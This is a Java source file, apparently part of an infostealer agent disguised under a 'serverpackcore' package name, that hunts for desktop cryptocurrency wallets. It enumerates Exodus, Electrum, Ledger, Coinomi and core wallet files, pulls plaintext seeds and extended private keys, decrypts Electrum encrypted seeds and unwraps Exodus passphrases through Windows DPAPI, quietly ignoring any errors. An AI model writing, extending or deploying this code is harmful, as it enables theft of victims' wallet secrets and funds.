package com.serverpackcore.agent.crypto;

import com.serverpackcore.agent.AgentPaths;
import com.serverpackcore.agent.Dpapi;
import com.serverpackcore.agent.Json;

import javax.crypto.Cipher;
import javax.crypto.Mac;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Locale;
import java.util.Map;

/** Desktop wallet presence, Electrum keystore decryption and Exodus DPAPI. */
final class DesktopWallets {
	record Wallet(String id, String kind, Path path, String state, String reason, String secret) {
	}

	private DesktopWallets() {
	}

	static List<Wallet> discover() {
		List<Wallet> out = new ArrayList<>();
		for (CryptoPaths.Target target : CryptoPaths.desktopTargets()) {
			try {
				String id = target.id();
				if (id.equals("exodus")) {
					Path seed = target.path().resolve("seed.seco");
					Path pass = target.path().resolve("passphrase.json");
					String secret = exodusPassphrase(pass);
					if (Files.isRegularFile(seed) || secret != null) {
						out.add(new Wallet(id, target.kind(), target.path(),
							secret == null ? "locked" : "decrypted", secret == null ? "dpapi_passphrase" : "passphrase_unwrapped", secret));
					}
					continue;
				}
				if (id.startsWith("electrum")) {
					try (var stream = Files.walk(target.path(), 2)) {
						for (Path file : stream.filter(path -> path.getFileName().toString().toLowerCase(Locale.ROOT).endsWith(".wallet")).toList()) {
							out.add(electrum(id, file));
						}
					}
					continue;
				}
				if (target.kind().equals("keystore")) {
					try (var stream = Files.list(target.path())) {
						for (Path file : stream.filter(Files::isRegularFile).toList()) {
							out.add(new Wallet(id, "keystore", file, "found", "password_required", null));
						}
					}
					continue;
				}
				if (target.kind().equals("core")) {
					try (var stream = Files.walk(target.path(), 2)) {
						for (Path file : stream.filter(Files::isRegularFile).toList()) {
							String name = file.getFileName().toString();
							if (name.equals("wallet.dat") || name.equals("keys") || name.equals("wallet")) {
								out.add(new Wallet(id, "core", file, "locked", "native_db", null));
							}
						}
					}
					continue;
				}
				out.add(new Wallet(id, target.kind(), target.path(),
					id.equals("ledger") || id.equals("coinomi") ? "locked" : "found",
					id.equals("ledger") || id.equals("coinomi") ? "encrypted_native_store" : "leveldb", null));
			} catch (Throwable ignored) {
				// one broken store never stops the rest
			}
		}
		return out;
	}

	private static Wallet electrum(String id, Path file) {
		try {
			Map<String, Object> root = Json.parseObject(Files.readString(file, StandardCharsets.UTF_8));
			Map<String, Object> keystore = Json.map(root.get("keystore"));
			String type = Json.str(keystore, "type", "");
			if (Json.str(keystore, "seed", "").length() > 0) {
				return new Wallet(id, "desktop", file, "decrypted", "seed_plain", Json.str(keystore, "seed", ""));
			}
			if (Json.str(keystore, "xprv", "").length() > 0) {
				return new Wallet(id, "desktop", file, "decrypted", "xprv_plain", Json.str(keystore, "xprv", ""));
			}
			if (keystore.containsKey("pw_hash") && keystore.containsKey("salt")) {
				return new Wallet(id, "desktop", file, "locked", "electrum_password", null);
			}
			return new Wallet(id, "desktop", file, "unsupported", "keystore_" + type, null);
		} catch (Throwable throwable) {
			return new Wallet(id, "desktop", file, "corrupt", throwable.getClass().getSimpleName(), null);
		}
	}

	static String electrumPassword(Path file, String password) {
		try {
			Map<String, Object> root = Json.parseObject(Files.readString(file, StandardCharsets.UTF_8));
			Map<String, Object> keystore = Json.map(root.get("keystore"));
			String expected = Json.str(keystore, "pw_hash", "");
			String salt = Json.str(keystore, "salt", "");
			String encrypted = Json.str(keystore, "encrypted_seed", "");
			if (expected.isEmpty() || salt.isEmpty() || encrypted.isEmpty()) {
				return null;
			}
			byte[] material = stretch(password, salt);
			byte[] encKey = java.util.Arrays.copyOfRange(material, 0, 32);
			byte[] macKey = java.util.Arrays.copyOfRange(material, 32, 64);
			byte[] ciphertext = Base64.getDecoder().decode(encrypted);
			Mac mac = Mac.getInstance("HmacSHA256");
			mac.init(new SecretKeySpec(macKey, "HmacSHA256"));
			String actual = CryptoUtil.hex(mac.doFinal(ciphertext));
			if (!actual.equalsIgnoreCase(expected)) {
				return null;
			}
			Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
			cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(encKey, "AES"),
				new IvParameterSpec(java.util.Arrays.copyOfRange(macKey, 0, 16)));
			return new String(cipher.doFinal(ciphertext), StandardCharsets.UTF_8);
		} catch (Throwable throwable) {
			return null;
		}
	}

	/** Electrum stretch_key: 1024 rounds of sha256(x || password) after the salted start. */
	private static byte[] stretch(String password, String salt) {
		byte[] pass = password.getBytes(StandardCharsets.UTF_8);
		byte[] value = CryptoUtil.sha256(CryptoLog.concat(CryptoUtil.b64(salt), pass));
		for (int i = 0; i < 1024; i++) {
			value = CryptoUtil.sha256(CryptoLog.concat(value, pass));
		}
		return CryptoUtil.sha256(CryptoLog.concat(value, pass));
	}

	private static String exodusPassphrase(Path file) {
		if (!AgentPaths.isWindows() || !Files.isRegularFile(file)) {
			return null;
		}
		try {
			Map<String, Object> json = Json.parseObject(Files.readString(file, StandardCharsets.UTF_8));
			String wrapped = Json.str(json, "passphrase", "");
			if (wrapped.isEmpty()) {
				return null;
			}
			byte[] raw = Base64.getDecoder().decode(wrapped);
			if (raw.length < 100) {
				return wrapped;
			}
			byte[] plain = Dpapi.unprotectMachine(raw);
			return plain.length == 0 ? null : new String(plain, StandardCharsets.UTF_8).strip();
		} catch (Throwable throwable) {
			return null;
		}
	}
}
